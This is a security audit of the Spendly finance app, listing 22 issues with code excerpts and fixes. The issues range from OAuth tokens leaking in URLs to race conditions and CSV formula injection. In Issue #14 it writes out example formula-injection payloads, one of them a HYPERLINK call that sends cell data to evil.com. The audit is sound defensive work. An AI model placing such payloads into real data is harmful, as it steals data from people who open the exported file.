# Spendly Backend — Security & Code Quality Audit

> **Date**: 2026-05-10  
> **Scope**: Full-stack analysis of `spendly-backend` and `spendly-frontend`

---

## Issue #1 — 🔴 CRITICAL: Google OAuth Leaks Tokens in URL Redirect

**File**: `src/controllers/auth.controller.ts` (line ~284)

**Problem**: The `googleAuthCallbackGet` handler redirects with `accessToken` and `refreshToken` as URL query parameters:

```typescript
const params = new URLSearchParams({
  accessToken: result.tokens.accessToken,
  refreshToken: result.tokens.refreshToken,
  user: JSON.stringify(result.user),
});
res.redirect(`${env.FRONTEND_URL}/auth/google/callback?${params.toString()}`);
```

**Risk**: Tokens in URLs are logged in server access logs, browser history, HTTP `Referer` headers, and proxy/CDN logs. Any of these exposes full session credentials.

**Fix**: Use a one-time opaque authorization code:
1. Generate a short-lived random code, store it mapped to tokens (Redis/DB, 30s TTL).
2. Redirect with only the code: `/auth/google/callback?code=abc123`
3. Frontend exchanges the code via POST to receive tokens in the response body.

---

## Issue #2 — 🔴 HIGH: Webhook Signature Verification Vulnerable to Timing Attack

**File**: `src/services/billing.service.ts` (line ~98)

**Problem**: Razorpay payment signature is verified using `!==`:

```typescript
if (expectedSig !== razorpaySignature) {
  throw new AppError(400, 'Invalid payment signature');
}
```

**Risk**: String comparison short-circuits on first mismatch, enabling timing attacks to incrementally reconstruct valid signatures.

**Fix**:
```typescript
const expectedBuf = Buffer.from(expectedSig, 'hex');
const actualBuf = Buffer.from(razorpaySignature, 'hex');

if (expectedBuf.length !== actualBuf.length || !crypto.timingSafeEqual(expectedBuf, actualBuf)) {
  throw new AppError(400, 'Invalid payment signature');
}
```

---

## Issue #3 — 🔴 HIGH: Admin Endpoints Lack Input Validation

**File**: `src/controllers/admin.controller.ts`

**Problem**: `updateGlobalSettings` and `updateUserSettings` accept `req.body` without validation:

```typescript
const { llmProvider, llmModel } = req.body; // No validation!
```

Additionally, errors are caught as `any` and raw messages returned:
```typescript
} catch (error: any) {
  res.status(500).json({ success: false, error: error.message });
}
```

**Risk**:
- Arbitrary strings injected as `llmProvider`/`llmModel` → LLM initialization crashes
- Internal error messages leaked to clients

**Fix**:
1. Add Zod validation schema with `z.enum(LLM_PROVIDERS)` for provider.
2. Use `validate` middleware on routes.
3. Replace `catch (error: any)` with `next(err)` for centralized error handling.

---

## Issue #4 — 🟠 MEDIUM: Health Endpoint Exposes Internal Configuration

**File**: `src/server.ts` (line ~79)

**Problem**: The `/health` endpoint is unauthenticated and returns:
```typescript
res.json({
  status: 'ok',
  timestamp: new Date().toISOString(),
  env: env.NODE_ENV,
  llm, // ← Exposes provider name and model
});
```

**Risk**: Reveals LLM provider, model name, and environment mode to anyone — aids reconnaissance.

**Fix**: Return only `{ status: 'ok' }` publicly. Move detailed info behind admin auth or a separate `/admin/health` endpoint.

---

## Issue #5 — 🟠 HIGH: Missing Rate Limiting on Sensitive Auth Endpoints

**Files**: `src/routes/auth.routes.ts`, `src/middleware/rateLimiter.ts`

**Problem**: While `signup`/`signin` have `authLimiter`, these endpoints lack dedicated rate limiting:
- `POST /api/auth/refresh` — attackers can brute-force refresh token rotation
- `GET /api/auth/verify-email` — can probe verification tokens

**Fix**: Apply `authLimiter` (or a dedicated limiter) to `/auth/refresh` and `/auth/verify-email` routes.

---

## Issue #6 — 🟠 HIGH: `@prisma/client` Listed in devDependencies

**File**: `package.json`

**Problem**:
```json
"devDependencies": {
  "@prisma/client": "^6.19.2"
}
```

`@prisma/client` is the runtime ORM client imported throughout the app. Placing it in `devDependencies` means it won't be installed in production if `NODE_ENV=production` and `npm install --production` is used.

**Fix**: Move `@prisma/client` to `dependencies`.

---

## Issue #7 — 🟠 HIGH: Shared Google OAuth Client Has Concurrent Request State Leak

**File**: `src/lib/google-oauth.ts`

**Problem**: The OAuth2 client is a module-level singleton, and `oauth2Client.setCredentials(tokens)` mutates shared state:
```typescript
oauth2Client.setCredentials(tokens); // Shared across all requests!
```

**Risk**: Under concurrent requests, one user's Google credentials could leak to another user's request context.

**Fix**: Create a new OAuth2Client instance per request, or avoid using `setCredentials` on a shared instance — instead pass the access token directly to the userinfo fetch.

---

## Issue #8 — 🟡 MEDIUM: Content Security Policy Disabled in Helmet

**File**: `src/server.ts` (line ~34)

**Problem**:
```typescript
app.use(helmet({
  crossOriginResourcePolicy: { policy: 'cross-origin' },
  contentSecurityPolicy: false, // ← Disabled!
}));
```

**Risk**: CSP is one of the strongest defenses against XSS. Disabling it removes a critical security layer.

**Fix**: Configure a proper CSP policy instead of disabling:
```typescript
contentSecurityPolicy: {
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: ["'self'"],
    // Add other directives as needed
  }
}
```

---

## Issue #9 — 🟡 MEDIUM: N+1 Queries and Sequential DB Calls in Tools/Services

**Files**: `src/tools/index.ts`, `src/services/budget.service.ts`

**Problem 1** — Financial goals progress check (tools/index.ts):
```typescript
const goalsWithProgress = await Promise.all(goals.map(async (g) => {
  if (g.type === 'SPENDING_LIMIT') {
    const agg = await prisma.expense.aggregate({...}); // N separate queries
  }
}));
```

**Problem 2** — Budget recommendations run 3 monthly queries sequentially:
```typescript
for (const m of months) {
  const rows = await prisma.expense.groupBy({...}); // Sequential, not parallel
}
```

**Risk**: Performance degrades linearly with data volume; unnecessary latency in chat responses.

**Fix**:
1. Batch goal progress into a single grouped aggregate query.
2. Use `Promise.all()` for independent monthly queries.
3. Consider a single query with date range grouping.

---

## Issue #10 — 🟡 MEDIUM: Frontend Has Duplicate API Clients + localStorage Token Storage

**Files**: `src/api/client.ts`, `src/config/api.ts` (frontend)

**Problem 1** — Two separate API client implementations:
- `src/api/client.ts` — authenticated with refresh token logic
- `src/config/api.ts` — unauthenticated, used for expenses and chat streaming

The chat SSE stream in `config/api.ts` sends requests **without any auth header**:
```typescript
const res = await fetch(`${BASE_URL}/chat`, {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ query, threadId }), // No Authorization!
});
```

**Problem 2** — Tokens stored in `localStorage`:
```typescript
localStorage.setItem('accessToken', access);
localStorage.setItem('refreshToken', refresh);
```

**Risk**:
- Duplicate clients cause confusion about which endpoints are protected
- `localStorage` is accessible to any XSS payload — both tokens can be stolen
- Chat streaming without auth may fail silently or indicate the endpoint is unprotected

**Fix**:
1. Consolidate into a single API client with auth support.
2. Consider HttpOnly cookies with `SameSite=Strict` for token storage.
3. Ensure the SSE chat stream includes the Authorization header.

---

## Issue #11 — 🔴 HIGH: Race Condition in Plan Limit Check (TOCTOU)

**File**: `src/services/billing.service.ts` (lines 159–185)

**Problem**: `checkPlanLimit()` reads the current count, then the caller creates the expense/message separately. Between the count check and the insert, concurrent requests can exceed the limit:

```typescript
export async function checkPlanLimit(userId: number, resource: 'expenses' | 'aiMessages') {
  // ... reads current count ...
  if (count >= limit) { throw ... }
  // ← Another request slips through here before the expense is created
}
```

**Risk**: Free-tier users can bypass plan limits by sending concurrent requests (e.g., 5 simultaneous expense-creation calls when they have 99/100 used → all 5 pass the check).

**Fix**: Use a `$transaction` with serializable isolation level, or implement a database-level constraint/counter that atomically checks-and-increments.

---

## Issue #12 — 🔴 HIGH: Race Condition in Recurring Expense Processing

**File**: `src/services/recurring.service.ts` (lines 78–108)

**Problem**: `processRecurringExpenses()` has no locking mechanism. If two server instances (or cron overlaps) run simultaneously, both read `nextDueDate <= today` before either updates it, causing **duplicate expense entries**.

**Risk**: Users see double-charged recurring expenses in their records.

**Fix**: 
- Use a database advisory lock or a `SELECT ... FOR UPDATE` within a transaction.
- Alternatively, add an idempotency check (e.g., unique constraint on `[recurringExpenseId, date]`).

---

## Issue #13 — 🔴 HIGH: Admin `getUserDetails` Leaks `passwordHash` and Secret Tokens

**File**: `src/controllers/admin.controller.ts` (lines 7–41)

**Problem**: The `getUserDetails` endpoint uses `include` without field exclusion:

```typescript
const user = await prisma.user.findUnique({
  where: { id: userId },
  include: {
    settings: true,
    expenses: { orderBy: { date: 'desc' }, take: 50 },
    chatMessages: { orderBy: { createdAt: 'desc' }, take: 100 },
    toolCallLogs: { orderBy: { createdAt: 'desc' }, take: 100 },
    // ...
  }
});
res.json({ success: true, data: user }); // ← Returns FULL user record
```

This returns the **entire** User model including:
- `passwordHash`
- `emailVerificationToken`
- `passwordResetToken`
- `passwordResetTokenExpiry`
- `googleId`

**Risk**: Even admin users should not see password hashes or active security tokens. If an admin account is compromised, all user credentials are exposed.

**Fix**: Use `select` instead of `include` to explicitly whitelist only safe fields. Never return `passwordHash` or reset/verification tokens.

---

## Issue #14 — 🟠 HIGH: CSV Export Vulnerable to Formula Injection

**File**: `src/controllers/expense.controller.ts` (lines 155–180)

**Problem**: The `escapeCell()` function only handles double-quote escaping:

```typescript
const escapeCell = (v: string) => `"${v.replace(/"/g, '""')}"`;
```

It does NOT strip formula-triggering characters (`=`, `+`, `-`, `@`, `\t`, `\r`). An attacker can create an expense with title `=CMD("calc")` or `=HYPERLINK("http://evil.com/steal?cookie="&A1)`.

**Risk**: When a user exports their expenses and opens the CSV in Excel/LibreOffice, malicious formulas execute (CSV injection / formula injection attack).

**Fix**:
```typescript
const escapeCell = (v: string) => {
  let safe = v.replace(/"/g, '""');
  if (/^[=+\-@\t\r]/.test(safe)) safe = "'" + safe; // Prepend single quote
  return `"${safe}"`;
};
```

---

## Issue #15 — 🟠 HIGH: Webhook Missing Replay Protection

**File**: `src/services/billing.service.ts` (lines 125–170)

**Problem**: The webhook handler verifies the signature but has no protection against **replay attacks**. There's no:
- Timestamp validation (reject events older than X minutes)
- Idempotency key checking (reject duplicate event IDs)

**Risk**: A replayed `subscription.activated` webhook could re-activate a cancelled subscription. An attacker who captures a valid webhook payload can replay it indefinitely.

**Fix**:
1. Check the `event.created_at` timestamp — reject events older than 5 minutes.
2. Store processed event IDs in the database and reject duplicates.

---

## Issue #16 — 🟠 HIGH: No Import Row Limit — Denial of Service

**File**: `src/controllers/import.controller.ts` (lines 136–160)

**Problem**: The `confirmCsvImport` endpoint accepts a `rows` array with **no maximum length check**:

```typescript
const { rows } = req.body as { rows: Array<{...}> };
if (!Array.isArray(rows) || rows.length === 0) { ... }
// No max length check!
const savedCount = await bulkCreateFromParsed(userId, rows);
```

Similarly, `/import/csv` passes CSV content directly to LLM parsing with no row cap, and `/import/bulk-text` has no length limit on the text.

**Risk**: An attacker can send thousands/millions of rows, causing:
- Massive database writes
- Expensive LLM API calls
- Memory exhaustion
- Cost amplification

**Fix**: Add maximum limits (e.g., `MAX_IMPORT_ROWS = 500`) and reject requests exceeding them.

---

## Issue #17 — 🟠 MEDIUM: Webhook Missing Signature Header Validation

**File**: `src/controllers/billing.controller.ts` (lines 58–73)

**Problem**: The webhook handler casts the signature header without checking if it exists:

```typescript
const signature = req.headers['x-razorpay-signature'] as string;
```

If the header is missing, `signature` is `undefined`, which is then passed to `handleWebhookService()`. The HMAC comparison proceeds with `undefined` being compared to the computed hex string.

**Risk**: Depending on the behavior of `Buffer.from(undefined, 'hex')`, this could either crash or produce unexpected comparison results.

**Fix**: Validate the header exists before proceeding:
```typescript
if (!signature || typeof signature !== 'string') {
  res.status(400).json({ error: 'Missing signature header' });
  return;
}
```

---

## Issue #18 — 🟡 MEDIUM: Currency Service Has Unbounded Cache Growth

**File**: `src/services/currency.service.ts`

**Problem**: The `cache` Map grows without bounds — every unique currency base code adds an entry. Entries are only expired by TTL check on read, never proactively evicted:

```typescript
const cache = new Map<string, RateCache>();
// Never cleared, never size-limited
```

**Risk**: Memory leak over time, especially if users query many different currency codes.

**Fix**: Add a maximum cache size (e.g., 50 entries) with LRU eviction, or periodically clear the entire cache.

---

## Issue #19 — 🟡 MEDIUM: Refresh Token Table Grows Indefinitely

**File**: `src/services/auth.service.ts`

**Problem**: On token refresh, old tokens are revoked (`revokedAt = new Date()`) but **never deleted**. Every login and every refresh creates a new row. The `refresh_tokens` table grows indefinitely.

**Risk**: Database bloat, slow queries on token lookup over time.

**Fix**: Add a scheduled cleanup job:
```typescript
// Delete tokens that expired > 30 days ago
await prisma.refreshToken.deleteMany({
  where: { expiresAt: { lt: new Date(Date.now() - 30 * 24 * 60 * 60 * 1000) } }
});
```

---

## Issue #20 — 🟡 MEDIUM: Frontend Auth Store Persistence Bypass

**File**: `src/store/auth.store.ts` (frontend)

**Problem**: Zustand `persist` middleware stores `user` and `isAuthenticated` in localStorage:

```typescript
persist(
  (set, get) => ({ ... }),
  {
    name: 'auth-store',
    partialize: (state) => ({
      user: state.user,
      isAuthenticated: state.isAuthenticated,
    }),
  },
)
```

**Risk**: An attacker can manually set `{"state":{"user":{...},"isAuthenticated":true}}` in localStorage to bypass frontend route guards on initial render (before `hydrate()` completes). While API calls will still fail (no valid token), the admin UI structure/components are visible.

**Fix**: Never persist `isAuthenticated` — derive it from token presence. Always verify token validity on app load before rendering protected routes.

---

## Issue #21 — 🟡 MEDIUM: `finance.service.ts` Uses Unsafe Type Casts

**File**: `src/services/finance.service.ts` (lines 29–44)

**Problem**:
```typescript
...(true as any), // bypass TS until migration is applied
```

And:
```typescript
const assets = ((settings as Record<string, unknown>)?.['netWorthAssets'] as number) ?? 0;
```

**Risk**: If the migration hasn't been applied, accessing non-existent columns will either throw at runtime or return undefined values that silently corrupt calculations.

**Fix**: Use proper Prisma schema-generated types. If fields are optional/new, handle them with proper null checks rather than `any` casts.

---

## Issue #22 — 🟡 LOW: `parseDurationMs` Doesn't Handle Week Unit

**File**: `src/lib/jwt.ts` (line 44)

**Problem**: The JWT expiry parser supports `s`, `m`, `h`, `d` but not `w` (weeks). If `JWT_REFRESH_EXPIRES_IN` is set to `7d` it works, but `1w` silently falls back to 15 minutes default.

```typescript
const match = duration.match(/^(\d+)([smhd])$/);
if (!match) return 15 * 60 * 1000; // Falls back silently!
```

**Risk**: Misconfigured JWT expiry silently defaults to 15 minutes, causing unexpected token expiration.

**Fix**: Add `w` to the regex and multiplier map, or throw an error on unrecognized formats.

---

## Summary Priority Matrix

| # | Severity | Issue | Effort |
|---|----------|-------|--------|
| 1 | 🔴 Critical | OAuth tokens in URL | Medium |
| 2 | 🔴 High | Timing attack on webhook sig | Low |
| 3 | 🔴 High | Admin no input validation | Low |
| 11 | 🔴 High | TOCTOU race in plan limits | Medium |
| 12 | 🔴 High | Race in recurring expense processing | Medium |
| 13 | 🔴 High | Admin leaks passwordHash | Low |
| 14 | 🟠 High | CSV formula injection | Low |
| 15 | 🟠 High | Webhook replay attack | Medium |
| 16 | 🟠 High | Import DoS (no row limit) | Low |
| 7 | 🟠 High | Shared OAuth client state | Low |
| 5 | 🟠 High | Missing rate limits | Low |
| 6 | 🟠 High | Prisma client in devDeps | Trivial |
| 17 | 🟠 Medium | Webhook missing header check | Trivial |
| 4 | 🟡 Medium | Health endpoint info leak | Trivial |
| 8 | 🟡 Medium | CSP disabled | Medium |
| 9 | 🟡 Medium | N+1 queries | Medium |
| 10 | 🟡 Medium | Duplicate API clients | Medium |
| 18 | 🟡 Medium | Unbounded currency cache | Low |
| 19 | 🟡 Medium | Refresh tokens never deleted | Low |
| 20 | 🟡 Medium | Frontend auth store bypass | Low |
| 21 | 🟡 Medium | Unsafe type casts in finance | Low |
| 22 | 🟡 Low | JWT parser missing week unit | Trivial |
